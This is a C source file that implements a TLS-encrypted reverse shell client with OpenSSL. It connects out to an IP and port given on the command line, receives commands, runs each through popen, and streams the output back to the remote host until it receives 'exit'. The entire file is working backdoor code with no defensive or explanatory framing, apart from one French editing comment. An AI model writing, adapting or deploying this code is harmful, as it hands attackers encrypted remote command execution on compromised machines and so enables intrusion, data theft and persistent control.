#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void init_openssl()
{
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX *create_context()
{
    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }
    return ctx;
}

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage: %s <server_ip> <port>\n", argv[0]);
        exit(1);
    }

    init_openssl();
    SSL_CTX *ctx = create_context();

    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr.s_addr = inet_addr(argv[1]);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0)
    {
        perror("Connection failed");
        exit(1);
    }

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0)
    {
        ERR_print_errors_fp(stderr);
    } // Remplace le bloc `else { ... }` dans main par ceci :

    else
    {
        while (1)
        {
            char command[1024] = {0};
            int read_bytes = SSL_read(ssl, command, sizeof(command) - 1);
            if (read_bytes <= 0)
                break;

            command[read_bytes] = '\0';

            if (strcmp(command, "exit") == 0)
                break;

            FILE *fp = popen(command, "r");
            if (!fp)
            {
                perror("popen failed");
                exit(1);
            }

            char output[4096];
            while (fgets(output, sizeof(output), fp) != NULL)
            {
                SSL_write(ssl, output, strlen(output));
            }

            pclose(fp);

            const char *end_marker = "<END>";
            SSL_write(ssl, end_marker, strlen(end_marker));
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    EVP_cleanup();
    return 0;
}
